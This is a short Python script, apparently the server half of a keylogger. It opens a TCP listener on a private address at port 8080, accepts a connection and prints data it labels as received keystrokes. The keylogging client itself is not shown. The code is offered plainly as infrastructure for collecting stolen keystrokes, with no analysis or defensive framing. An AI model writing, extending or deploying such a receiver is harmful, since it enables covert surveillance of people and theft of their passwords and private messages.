import socket

# Set up the socket connection
host = '10.173.240.87'
port = 8080

# Create a socket object
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the address and port
sock.bind((host, port))

# Listen for incoming connections
sock.listen(1)
print("Listener started!")

# Accept incoming connections
conn, addr = sock.accept()
print("Connected by", addr)

# Receive keystrokes from the keylogger
while True:
    data = conn.recv(1024)
    if not data:
        break
    print("Received keystroke:",data.decode())